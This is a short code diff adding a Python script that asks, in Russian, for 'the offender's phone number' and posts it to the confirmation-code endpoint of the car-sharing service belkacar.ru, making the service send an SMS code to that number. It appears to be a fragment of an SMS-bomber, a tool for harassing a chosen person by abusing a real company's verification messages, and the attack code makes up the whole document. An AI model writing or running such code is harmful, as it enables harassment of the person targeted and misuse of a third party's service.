@@ -1,0 +1,6 @@
+import requests
+phone = input("Введите номер обидчика +")
+try:
+    requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': phone})
+except:
+    print('-')
